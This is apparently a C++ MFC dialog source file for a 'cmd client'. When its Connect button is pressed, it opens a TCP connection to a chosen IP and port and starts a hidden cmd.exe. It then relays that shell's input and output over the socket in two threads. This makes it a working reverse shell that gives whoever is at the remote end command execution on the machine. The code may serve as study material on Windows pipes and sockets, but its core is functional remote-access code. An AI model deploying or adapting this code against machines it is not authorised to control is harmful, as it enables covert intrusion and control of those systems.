// MyCmd_cltDlg.cpp : implementation file
//

#include "stdafx.h"
#include "MyCmd_clt.h"
#include "MyCmd_cltDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyCmd_cltDlg dialog
THREADARG CMyCmd_cltDlg::m_ThreadArg = {NULL};

CMyCmd_cltDlg::CMyCmd_cltDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMyCmd_cltDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMyCmd_cltDlg)
	m_dwPort = 0;
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);

    m_sockClient = NULL;
}

void CMyCmd_cltDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyCmd_cltDlg)
	DDX_Control(pDX, IDC_IPADDRESS, m_IP);
	DDX_Text(pDX, EDT_PORT, m_dwPort);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMyCmd_cltDlg, CDialog)
	//{{AFX_MSG_MAP(CMyCmd_cltDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_DESTROY()
	ON_BN_CLICKED(ID_CONNECT, OnConnect)
	ON_BN_CLICKED(IDC_BTNCONNECT, OnBtnconnect)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyCmd_cltDlg message handlers

BOOL CMyCmd_cltDlg::InitSocekt()
{
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;
    wVersionRequested = MAKEWORD( 2, 2 );
    err = WSAStartup( wVersionRequested, &wsaData );
    if ( err != 0 )
    {
        TRACE("ssc WSAStartup failed[%d]", WSAGetLastError());
        return FALSE;
    }
    if ( LOBYTE( wsaData.wVersion ) != 2 ||
        HIBYTE( wsaData.wVersion ) != 2 )
    {
        TRACE("ssc wsaData error[%d]", WSAGetLastError());
        WSACleanup( );
        return FALSE; 
    }
    return TRUE;
}

BOOL CMyCmd_cltDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
    
    InitSocekt();

    m_IP.SetAddress(htonl(inet_addr("127.0.0.1")));
    m_dwPort = 27149;

    UpdateData(FALSE);
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CMyCmd_cltDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMyCmd_cltDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMyCmd_cltDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

DWORD CMyCmd_cltDlg::ThreadRecv(LPVOID lpParameter)
{    
    BOOL bRet = FALSE;
    SOCKET sClient = ((PTHREADARG)lpParameter)->m_sockClient;
    while(TRUE)
    {
        char szEnter[MAXBYTE] = {0};
        int nSendedBytes = recv(sClient,
            szEnter,
            MAXBYTE,
            0);
        if ((size_t)nSendedBytes != strlen(szEnter))
        {
            TRACE("ssc recv() failed[%d]", WSAGetLastError());
            return FALSE;
        }
        else
        {
            TRACE("ssc recv() [%s]", szEnter);
        }
        DWORD dwRealWrtSize = 0;
        
        HANDLE hWritePipe = ((PTHREADARG)lpParameter)->m_hWritePipe; 
        bRet = WriteFile(hWritePipe, 
                        szEnter,
                        strlen(szEnter),
                        &dwRealWrtSize,
                        NULL);
    }
}

DWORD CMyCmd_cltDlg::GetCMDOut(LPVOID lpParameter)
{
    BOOL bRet = FALSE;
    DWORD dwBufSize = 0;
    HANDLE hReadPipe = ((PTHREADARG)lpParameter)->m_hReadPipe;        
    SOCKET sClient = ((PTHREADARG)lpParameter)->m_sockClient;

    while (TRUE)
    {
        bRet = PeekNamedPipe(hReadPipe, NULL, 0, NULL, &dwBufSize, NULL);
        if (bRet == FALSE)
        {
            TRACE("ssc PeekNamedPipe failed[%d]", GetLastError());
            return FALSE; // when close hReadPipe, this thread can be exit            
        }
        if (dwBufSize == 0)
        {
            //管道没有数据时，暂停1s防止CPU满载
            Sleep(1000);
            continue;
        }
        
        char *pszBuf = new char[dwBufSize + 1];
        memset(pszBuf, 0, dwBufSize + 1);
        
        if (pszBuf == NULL)
        {
            TRACE("ssc new char failed");
            ExitProcess(0);
        }
        
        DWORD dwRealSize = 0;
        bRet = ReadFile(hReadPipe, pszBuf, dwBufSize, &dwRealSize, NULL);
        if (bRet == FALSE)
        {
            TRACE("ssc ReadFile failed[%d]", GetLastError());
            continue;
        }
        
        if (dwRealSize < dwBufSize)
        {
            TRACE("ssc ReadFile error dwRealSize is [%d], dwBufSize is [%d]", 
                dwRealSize, dwBufSize);
            
            continue;
        }
        
        ((PTHREADARG)lpParameter)->m_pszBuf = pszBuf;
        
        int nSendedBytes = send(sClient,
                                pszBuf,
                                strlen(pszBuf) + 1,
                                0);
        if ((size_t)nSendedBytes != strlen(pszBuf) + 1)
        {
            TRACE("ssc send() failed[%d]", WSAGetLastError());
            return 0;
        }
    }
    return TRUE;
}

void CMyCmd_cltDlg::OnDestroy() 
{
	CDialog::OnDestroy();
	
	// TODO: Add your message handler code here
    closesocket(m_sockClient);
	WSACleanup( );

    DWORD dwWrtSize = 0;
    BOOL bRet = FALSE;
    bRet = WriteFile(m_hWritePipe,
        "exit\r\n",
        strlen("exit\r\n"),
        &dwWrtSize,
        NULL);
    if (bRet == FALSE)
    {
        TRACE("ssc WriteFile failed[%d]", GetLastError());
        TerminateProcess(m_hCmd, 0);
    }
    
    if (m_lstHandle.IsEmpty() == TRUE)
    {
        return;
    }
    
    POSITION pos = m_lstHandle.GetHeadPosition();
    while (pos)
    {
        HANDLE *phTmp = m_lstHandle.GetNext(pos);
        CloseHandle(*phTmp);
    }
    m_lstHandle.RemoveAll();
}

void CMyCmd_cltDlg::OnConnect() 
{
	// TODO: Add your control notification handler code here
    
}

void CMyCmd_cltDlg::OnBtnconnect() 
{
	// TODO: Add your control notification handler code here
    UpdateData(TRUE);
    UpdateData(FALSE);

    BOOL bRet = FALSE;
    //网络相关
    //1. 创建套接字（socket）
    m_sockClient = socket(AF_INET,
        SOCK_STREAM, //流式,TCP
        0);
    if (m_sockClient == INVALID_SOCKET)
    {
        TRACE("ssc socket() failed[%d]", WSAGetLastError());
        return;
    }
    //2. 向服务器发出连接请求（connect）
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    DWORD dwIP = 0;
    m_IP.GetAddress(dwIP);
    addr.sin_addr.S_un.S_addr = htonl(dwIP); //客户端需要指定连接IP

    addr.sin_port = htons((USHORT)m_dwPort); //连接端口
    bRet = connect(m_sockClient, (sockaddr*)&addr, sizeof(sockaddr));
    if (bRet == SOCKET_ERROR)
    {
        TRACE("ssc connect() failed[%d]", WSAGetLastError());
        return;
    }
    
    //管道相关
    SECURITY_ATTRIBUTES sa;
    memset(&sa, 0, sizeof(SECURITY_ATTRIBUTES));
    sa.bInheritHandle = TRUE;
    
    //m_hReadPipe -- m_hCmdWritePipe
    //m_hWritePipe -- m_hCmdReadPipe
    bRet = CreatePipe(&m_hReadPipe, &m_hCmdWritePipe, &sa, 0);
    if (bRet == FALSE)
    {
        TRACE("ssc CreatePipe(m_hReadPipe, m_hCmdWritePipe)failed[%d]", GetLastError());
        return;
    }
    
    bRet = CreatePipe(&m_hCmdReadPipe, &m_hWritePipe, &sa, 0);
    if (bRet == FALSE)
    {
        TRACE("ssc CreatePipe(&m_hCmdReadPipe, &m_hWritePipe)failed[%d]", GetLastError());
        return;
    }
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));
    
    STARTUPINFO si;
    memset(&si, 0, sizeof(STARTUPINFO));
    si.dwFlags = STARTF_USESTDHANDLES; 
    si.hStdInput = m_hCmdReadPipe;
    si.hStdOutput = m_hCmdWritePipe;
    si.hStdError = m_hCmdWritePipe;
    
    char szCmdPath[MAXBYTE] = {0};
    UINT nSize = GetSystemDirectory(szCmdPath, MAXBYTE);
    if (nSize == 0)
    {
        TRACE("ssc GetSystemDirectory failed[%d]", GetLastError());
        return;
    }
    strcat(szCmdPath, "\\cmd.exe");
    bRet = CreateProcess(NULL, 
        szCmdPath,
        &sa,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi);
    if (bRet == FALSE)
    {
        TRACE("ssc CreateProcess failed[%d]", GetLastError());
        return;
    }
    
    m_hCmd = pi.hProcess;
    
    m_ThreadArg.m_sockClient = m_sockClient;
    m_ThreadArg.m_hWnd = GetSafeHwnd();
    m_ThreadArg.m_hReadPipe = m_hReadPipe;
    m_ThreadArg.m_hWritePipe = m_hWritePipe;
    
    //接收数据的线程
    AfxBeginThread((AFX_THREADPROC)ThreadRecv, (LPVOID)&m_ThreadArg);
    
    //获取cmd输出的线程
    AfxBeginThread((AFX_THREADPROC)GetCMDOut, (LPVOID)&m_ThreadArg);
}
